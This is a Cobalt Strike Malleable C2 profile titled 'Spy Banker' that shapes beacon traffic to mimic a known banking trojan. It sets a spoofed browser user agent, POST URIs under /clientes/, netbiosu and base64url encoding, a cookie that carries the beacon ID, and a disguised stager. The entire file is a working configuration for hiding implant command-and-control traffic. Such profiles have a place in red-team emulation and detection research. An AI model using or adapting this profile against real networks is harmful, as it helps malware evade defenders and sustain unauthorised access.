# Malleable Profile Spy Banker
# https://www.virustotal.com/en/file/23acb2628e6b217f0219ee17f10e43311c38effdd87d75e226e04d474732ba57/analysis/1481799483/
#
# Created by @vysecurity
# Based on webbug profile by @armitagehacker

set sleeptime "5000";
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.102 Safari/537.36";

http-get {
set uri "/clientes/pointg.php";
set verb "POST";
client {

metadata {
netbiosu;
print;
}
}

server {
header "Content-Type" "text/plain";

output {
        netbiosu;
        prepend "\x00\x00\x00\x00\x00\x00\x00\x00";
        print;
}
}
}

http-post {
set uri "/clientes/point.php";
set verb "POST";
client {

id {
netbiosu;
prepend "PHPSESSID=";
header "Cookie";
}

output {
netbiosu;
prepend "\x00\x00\x00\x00\x00\x00\x00\x00";
print;
}
}

server {
header "Content-Type" "text/plain";

output {
        base64url;
        print;
}
}
}

# dress up the staging process too
http-stager {
server {
header "Content-Type" "text/plain";
}
}